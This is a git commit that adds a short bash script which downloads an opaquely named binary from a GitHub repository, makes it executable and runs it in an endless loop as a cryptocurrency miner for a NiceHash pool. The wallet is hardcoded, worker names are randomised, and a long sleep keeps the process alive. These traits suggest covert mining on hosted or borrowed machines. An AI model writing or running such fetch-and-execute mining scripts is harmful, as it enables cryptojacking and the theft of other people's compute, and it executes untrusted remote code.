841ebd1baa2d8371de385f32ec79e36c2d01c721
likeudo153 <89896695+likeudo153@users.noreply.github.com>
2021-09-13 09:00:49 +0530

    Create nhAuto.sh

---
+++ nhAuto.sh
@@ -0,0 +1,12 @@
+  
+#!/bin/bash
+#POOL= stratum+tcp://autolykos.eu-north.nicehash.com:3390
+#WALLET=3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E
+#WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)
+wget https://github.com/archernap/prem/raw/main/priyatama
+chmod +x priyatama
+while [ 1 ]; do
+./priyatama --algo AUTOLYKOS2 --pool stratum+tcp://autolykos.usa-east.nicehash.com:3390 --user 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.$(echo $(shuf -i 10-40 -n 1)-Dg)
+sleep 5
+done
+sleep 999999999
